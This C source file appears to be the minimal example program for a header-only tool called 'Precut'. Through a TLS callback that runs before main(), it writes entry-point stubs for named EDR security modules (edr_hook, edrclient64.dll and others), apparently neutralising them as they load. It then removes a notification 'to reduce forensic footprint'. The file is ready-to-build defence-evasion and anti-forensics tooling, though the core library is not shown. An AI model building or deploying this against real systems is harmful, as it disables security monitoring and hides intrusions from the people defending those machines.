/*
 * standalone.c — minimal Precut binary using the single-header library
 *
 * This is the simplest possible usage of precut.h. PRECUT_TLS_AUTO
 * handles the TLS callback registration, so main() has nothing to do —
 * the entry-point stubs are already written before it runs.
 *
 * Replace the PRECUT_TARGETS placeholders with real module names from
 * your lab environment. Build with MSVC x64, /MT, /INCLUDE:_tls_used.
 */

#define PRECUT_IMPLEMENTATION
#define PRECUT_TLS_AUTO

#define PRECUT_TARGETS                     \
    PRECUT_PREFIX(L"edr_hook")             \
    PRECUT_PREFIX(L"edr_dev")              \
    PRECUT_EXACT(L"edrclient64.dll")       \
    PRECUT_EXACT(L"edrclient.dll")

#include "../precut.h"

int main(void)
{
    /* TLS callback already ran precut_arm() before we got here.
     * Touch the sentinel so the compiler keeps TLS alive. */
    (void)g_precut_tls_sentinel;

    /* Optional: remove the notification to reduce forensic footprint */
    precut_disarm();

    return 0;
}
